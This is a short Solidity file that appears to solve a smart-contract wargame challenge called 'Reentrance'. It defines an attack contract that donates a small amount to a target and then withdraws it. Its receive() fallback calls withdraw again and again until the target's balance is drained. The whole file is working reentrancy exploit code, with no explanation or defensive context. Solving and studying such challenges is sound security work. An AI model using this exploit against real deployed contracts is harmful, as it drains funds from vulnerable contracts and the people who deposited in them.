// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Script, console2} from "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttackContract {
    address challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IReentrance(challengeInstance).donate{value: 0.001 ether}(
            address(this)
        );
        IReentrance(challengeInstance).withdraw(0.001 ether);
    }

    receive() external payable {
        if (challengeInstance.balance > 0.001 ether) {
            IReentrance(challengeInstance).withdraw(0.001 ether);
        } else {
            uint256 balance = challengeInstance.balance;
            IReentrance(challengeInstance).withdraw(balance);
        }
    }
}
